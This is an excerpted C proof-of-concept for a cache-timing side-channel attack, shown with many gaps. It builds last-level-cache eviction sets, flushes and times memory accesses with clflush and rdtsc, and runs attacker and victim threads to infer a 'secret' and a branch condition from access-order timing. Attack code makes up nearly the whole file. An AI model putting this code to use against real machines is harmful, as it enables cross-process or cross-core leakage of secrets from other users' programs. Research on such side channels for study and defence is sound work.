...
#define DEBUG_TEST_TIME 0
#define TEST_TIME_REPT 1000
...
volatile void *attackerAddr[2*LLC_CACHE_WAYS];

//volatile void *eviction_set[2*LLC_CACHE_WAYS];
...
{
	void *addrA = attackerAddr[2*LLC_CACHE_WAYS-2];
	void *addrB = attackerAddr[2*LLC_CACHE_WAYS-1];
	int result;
...
static int test_eviction_setVictim16(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB, int (*victim)(void))
{
	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	...
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
 	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr23 = ptr->address;
	void *addr24 = ptr->next->address;
	void *addr25 = ptr->next->next->address;
	void *addr26 = ptr->next->next->next->address;
	void *addr27 = ptr->next->next->next->next->address;
	void *addr28 = ptr->next->next->next->next->next->address;
	void *addr29 = ptr->next->next->next->next->next->next->address;
	void *addr30 = ptr->next->next->next->next->next->next->next->address;
	...
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr13^0x8000);
	maccess((uint64_t)addr14^0x8000);
	maccess((uint64_t)addr15^0x8000);
	maccess((uint64_t)addr16^0x8000);
	...
	latenci[0] = time_access(addr16);
	latenci[1] = time_access(addr17);
	latenci[2] = time_access(addr18);
	latenci[3] = time_access(addr19);
	latenci[4] = time_access(addr20);
	latenci[5] = time_access(addr21);
	latenci[6] = time_access(addr22);
	latenci[7] = time_access(addr23);
	latenci[8] = time_access(addr24);
	latenci[9] = time_access(addr25);
	latenci[10] = time_access(addr26);
	latenci[11] = time_access(addr27);
	latenci[12] = time_access(addr28);
	latenci[13] = time_access(addr29);
	latenci[14] = time_access(addrA);
...
*/
	...
	for(int m = 0; m < 16; m++) {
		if(get_cache_set_index(&latenci[m], 3) == target_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[14] > INTERRUPT_THRESHOLD || latenci[15] > INTERRUPT_THRESHOLD) {
		return -1;
	}
...
void *scratch_eviction_set[2*LLC_CACHE_WAYS-2];
static int test_eviction_setVictim(struct Node *eviction_set, void *addrA, void *addrB, int *timeA, int *timeB, int (*victim)(void))
{
	int i = 0;
    struct Node* ptr = eviction_set;
    for (i = 0; i < (2*LLC_CACHE_WAYS-2); i++) {
        if(ptr == NULL) {
            printf("[X] NULL POINTER: test_eviction_setVictim\n");
            exit(1);
        }
        scratch_eviction_set[i] = (uint64_t)ptr->address;
        ptr = ptr->next;
    }
    
	int latency[LLC_CACHE_WAYS+1];
    
    for(i = 0; i < (LLC_CACHE_WAYS-1); i++) {
        _mm_clflush(scratch_eviction_set[i]);
    }
    
	_mm_clflush(addrA);
	_mm_clflush(addrB);

    for(i = (LLC_CACHE_WAYS-1); i < (2*LLC_CACHE_WAYS-2); i++) {
        _mm_clflush(scratch_eviction_set[i]);
    }
    ...
    // Access
    for(i = 0; i < (LLC_CACHE_WAYS-1); i++) {
        maccess(scratch_eviction_set[i]);
    }
    
    // Flush
    for(i = 0; i < (LLC_CACHE_WAYS); i++) {
        maccess((uint64_t)scratch_eviction_set[i] ^ L2_INDEX_STRIDE);
    }
...
//	maccess(addrA);
    ...
    for(i = (LLC_CACHE_WAYS-1); i < (2*LLC_CACHE_WAYS-3); i++) {
        maccess(scratch_eviction_set[i]);
        asm volatile("lfence\n");
    }
    ...
    for(i = (LLC_CACHE_WAYS-1); i < (2*LLC_CACHE_WAYS-3); i++) {
        latency[i-(LLC_CACHE_WAYS-1)] = time_access(scratch_eviction_set[i]);
    }
    
	latency[LLC_CACHE_WAYS-1] = time_access(addrA);
	latency[LLC_CACHE_WAYS] = time_access(addrB);
...
*/
	...
	for(int m = 0; m < LLC_CACHE_WAYS; m++) {
		if(get_cache_set_index(&latency[m], 3) == target_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latency[LLC_CACHE_WAYS-2] > INTERRUPT_THRESHOLD || latency[LLC_CACHE_WAYS-1] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
        for(i = 0; i < LLC_CACHE_WAYS; i++) {
            printf("EV11[set%d]   %d\n", get_cache_set_index(&latency[i], 3), latency[i]);  
        }
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latency[LLC_CACHE_WAYS-1];
	*timeB = latency[LLC_CACHE_WAYS];

	return 0;
}

static int test_eviction_setVictimBA(struct Node *eviction_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
...
static int test_eviction_setVictimAB(struct Node *eviction_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
...
static int test_eviction_setAB(struct Node *eviction_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	int i = 0;
    struct Node* ptr = eviction_set;
    for (i = 0; i < (2*LLC_CACHE_WAYS-2); i++) {
        if(ptr == NULL) {
            printf("[X] NULL POINTER: test_eviction_setAB\n");
            exit(1);
        }
        scratch_eviction_set[i] = (uint64_t)ptr->address;
        ptr = ptr->next;
...
*/
	...
	if (latency[LLC_CACHE_WAYS-1] > INTERRUPT_THRESHOLD || latency[LLC_CACHE_WAYS] > INTERRUPT_THRESHOLD) {
		return -1;
	}
...
static int test_eviction_setBA(struct Node *eviction_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	int i = 0;
    struct Node* ptr = eviction_set;
    for (i = 0; i < (2*LLC_CACHE_WAYS-2); i++) {
        if(ptr == NULL) {
            printf("[X] NULL POINTER: test_eviction_setBA\n");
            exit(1);
        }
        scratch_eviction_set[i] = (uint64_t)ptr->address;
        ptr = ptr->next;
...
float test_time_rdtsc(void) {
    int i = 0, latency = 0, total = 0, interrupt = 0;
    float ret = 0;
    for (i = 0; i < TEST_TIME_REPT; i++) {
        
        latency = time_rdtsc();

        if (latency < INTERRUPT_THRESHOLD) { 
            if (DEBUG_TEST_TIME) printf("%" PRIu32 "\n", latency);
            total += latency;
        } 
        else {
            interrupt++;
    ...
    ret = (float)total / (TEST_TIME_REPT - interrupt);
    if (DEBUG_TEST_TIME) printf("Average: %" PRIu32 "\n", ret);
    return ret;
}

float test_time_L1_hit(void *addr) {
    int i = 0, latency = 0, total = 0, interrupt = 0;
    float ret = 0;
    for (i = 0; i < TEST_TIME_REPT; i++) {
        
        maccess(addr);
        latency = time_access(addr);
...
void *flush_set[LLC_CACHE_WAYS];
float test_time_flush(struct Node *eviction_set, void *addr, int flush_mask) {
	int i = 0, j = 0, latency = 0, total = 0, interrupt = 0;
    float ret = 0;
    
    struct Node* ptr = eviction_set;
    for (i = 0; i < LLC_CACHE_WAYS; i++) {
        if(ptr == NULL) {
            printf("[X] NULL POINTER: test_time_flush\n");
            exit(1);
        }
        flush_set[i] = (uint64_t)ptr->address ^ flush_mask;
        ptr = ptr->next;
        if (DEBUG_TEST_TIME) printf("%p\n", flush_set[i]);
    }
...
*/
 //buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
  ...
  while (1)
  {
    ...
    /* Test Flush Set */
    void *test_addr = buffer+CACHE_BLOCK_SIZE*target_set;
    struct Node* eviction_set_test = find_eviction_set(buffer, test_addr, &len0);
    if(DEBUG_TEST_TIME) print_eviction_set(eviction_set_test, len1);

    printf("\n[+] Testing Flush Set and Eviction Set\n");
    
    if(L2_INDEX_STRIDE >= LLC_INDEX_STRIDE || L1_INDEX_STRIDE >= L2_INDEX_STRIDE) {
        printf("[!] WARNING: check L1, L2, LLC strides.\n");
    }
    
    printf("[-] rdtsc overhead:               %.2f\n", test_time_rdtsc());
    printf("[-] L1 hit:                       %.2f\n", test_time_L1_hit(test_addr));
    printf("[-] L1 miss + L2 hit:             %.2f\n", test_time_flush(eviction_set_test, test_addr, L1_INDEX_STRIDE));
    printf("[-] L1 miss + L2 miss + LLC hit:  %.2f\n", test_time_flush(eviction_set_test, test_addr, L2_INDEX_STRIDE));
    printf("[-] L1 miss + L2 miss + LLC miss: %.2f\n", test_time_flush(eviction_set_test, test_addr, 0));
    

    struct Node* eviction_set1 = find_eviction_set(buffer, buffer+CACHE_BLOCK_SIZE*target_set, &len1);
    //struct Node* eviction_set1 = static_eviction_set1(&len1);

	int successes1s = 0;
	for (i = 0; i < 20; i++) {
	ret = test_eviction_set(eviction_set1, buffer+CACHE_BLOCK_SIZE*target_set);
		if (ret) {
			successes1s += 1;
		}
	}
	...
	while(successes1s < 20) {
        eviction_set1 = find_eviction_set(buffer, buffer+CACHE_BLOCK_SIZE*target_set, &len1);
        successes1s = 0;
        for (i = 0; i < 20; i++) {
            ret = test_eviction_set(eviction_set1, buffer+CACHE_BLOCK_SIZE*target_set);
            if (ret) {
    ...
    //test_step0(eviction_set1, buffer+CACHE_BLOCK_SIZE*target_set, buffer+CACHE_BLOCK_SIZE*target_set);    
    //test_step0(eviction_set1, buffer+CACHE_BLOCK_SIZE*target_set, buffer+CACHE_BLOCK_SIZE*target_set);   
	...
	void *addrA = buffer+CACHE_BLOCK_SIZE*target_set;
	...
	while(final_len != (2*LLC_CACHE_WAYS-2)) {
		// choose candidate
		if(t1 != len1) {
		  tempNode = travNode1;
	...
	if(final_len != (2*LLC_CACHE_WAYS-2)) {
...
//		printf("[+] GOOD SET\n\n");
		...
		for(int h = 0; h < (2*LLC_CACHE_WAYS-2); h++) {
			attackerAddr[h] = ptr->address;
            //eviction_set[h] = ptr->address;
			ptr = ptr->next;
		}
		//attackerAddr[22] = addrA;
		//attackerAddr[23] = addrB;
        attackerAddr[2*LLC_CACHE_WAYS-2] = addrA;
        attackerAddr[2*LLC_CACHE_WAYS-1] = addrB;
        
		*(uint64_t *)addrA = 0;
		*(uint64_t *)addrB = 0;
		//bp = &attackerAddr[23];
        bp = &attackerAddr[2*LLC_CACHE_WAYS-1];
		bpp = &bp;
		bppp = &bpp;
		bpppp = &bppp;
		bppppp = &bpppp;
		...
		ABn_BA = 0;
	 	...
	 	for(int m = 0; m < 10000; m++) {
			...
			int errorAB = test_eviction_setVictim16(eviction_final, addrA, addrB, &timeA_AB, &timeB_AB, dummy_AB);  
			int errorBA = test_eviction_setVictim16(eviction_final, addrA, addrB, &timeA_BA, &timeB_BA, dummy_BA);
...
//		fflush(stdout);
    ...
    //printf("%d,", static_BA);
		//fflush(stdout);
		return static_BA;
        if((static_BA < STATIC_THRESHOLD) || (AnB_AB < STATIC_THRESHOLD)) return 0;
...
#define SAMPLES 100
void *attacker_eviction_set[2*LLC_CACHE_WAYS-2];
void* attacker_thread(void *p)
{
    int i = 0;
    for (i = 0; i < (2*LLC_CACHE_WAYS-2); i++) {
        attacker_eviction_set[i] = attackerAddr[i];
    }
...
printf("\n\n TIME1 = %lld\n\n", ((uint64_t)hia << 32) | loa); */  
    ...
    for(i = 0; i < (LLC_CACHE_WAYS-1); i++) {
        _mm_clflush(attacker_eviction_set[i]);
    }
    ...
    // Access
    for(i = 0; i < (LLC_CACHE_WAYS-1); i++) {
        maccess(attacker_eviction_set[i]);
    }
    
    // Flush
    for(i = 0; i < (LLC_CACHE_WAYS); i++) {
        maccess((uint64_t)attacker_eviction_set[i] ^ L2_INDEX_STRIDE);
    }
    ...
    for(i = (LLC_CACHE_WAYS-1); i < (2*LLC_CACHE_WAYS-3); i++) {
        latenci[i-(LLC_CACHE_WAYS-1)] = time_access(attacker_eviction_set[i]);
    }
    
	latenci[LLC_CACHE_WAYS-1] = time_access(addrA);
	latenci[LLC_CACHE_WAYS] = time_access(addrB);

    if(debug) {
        for(i = 0; i < LLC_CACHE_WAYS; i++) {
            printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[i], 3), latenci[i]);  
        }
	 	printf("\n");
		fflush(stdout);
	}
	//probe
	timeA = latenci[LLC_CACHE_WAYS-1];
	timeB = latenci[LLC_CACHE_WAYS];
	flag = 7;
...
static unsigned int asm_contention16(void){
	volatile unsigned int *s = &secret;
 //volatile unsigned int ****b = &brcondptrptrptr;
 ...
 volatile unsigned int **b = &brcondptr;
  ...
  unsigned int *chess = &chessboard;
	...
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addr23 = attackerAddr[22];
	void *addr24 = attackerAddr[23];
	void *addr25 = attackerAddr[24];
	void *addr26 = attackerAddr[25];
	void *addr27 = attackerAddr[26];
	void *addr28 = attackerAddr[27];
	void *addr29 = attackerAddr[28];
	void *addr30 = attackerAddr[29];	
	void *addrA = attackerAddr[30];
	void *addrB = attackerAddr[31];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
...
void *victim_eviction_set[2*LLC_CACHE_WAYS-2];
void* victim_threadAB(void)
{
    int i = 0;
    for (i = 0; i < (2*LLC_CACHE_WAYS-2); i++) {
        victim_eviction_set[i] = attackerAddr[i];
    }
    ...
    for(i = 0; i < (LLC_CACHE_WAYS-1); i++) {
        _mm_clflush(victim_eviction_set[i]);
    }
    ...
    // Flush
    for(i = 0; i < (LLC_CACHE_WAYS); i++) {
        maccess((uint64_t)victim_eviction_set[i] ^ L2_INDEX_STRIDE);
    }
...
void* contentionfixed_victim_thread16(unsigned int hdis)
{
	volatile unsigned int *s = &secret;
	volatile unsigned int **b = &brcondptr;
	volatile unsigned int *m = &mask;
...
int main(void)
{
	...
	while(setup_everything(buffer) < STATIC_THRESHOLD) {
		target_set++;
		target_set %= LLC_CACHE_SETS_PER_SLICE;	
	}
...
*/
	//check addresses
/*	for(int g = 0; g < 24; g++) {
		if(get_cache_set_index((uint64_t)&attackerAddr[0], 3) == target_set)
			printf("[!] attackerAddr[%d] same set\n", g);
	}
	if(get_cache_set_index((uint64_t)&flag, 3) == target_set)
...
if(1){
	...
	printf("[+][3] Multi-Core Static A-B sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/50] vs dual[%0.2d/50]\n", workedAB, dualAB, goneAB, sameAB, workedAB, dualAB);
	...
	printf("[+][3] Multi-Core Static B-A sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/50] vs dual[%0.2d/50]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, dualBA);
...
if(1){
	...
	for(int k = 0; k < 50; k++) {
        ...
        syncflag = 0;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread16, NULL);
		//printf("[+] Started AB Victim Thread\n");	
		if(victim_threadAB16()){
			if(timeA > 150 && timeB < 150) {
				workedAB++;
			}
			if(timeA < 150 && timeB < 150) {
        ...
        if(1) {
            ...
            for(int x = 0; x < INNER_ITER; x++) {  
                ...
                for(int k = 0; k < x; ) {
                    ...
                    int loadB_time = contentionfixed_victim_thread16(BRCOND);
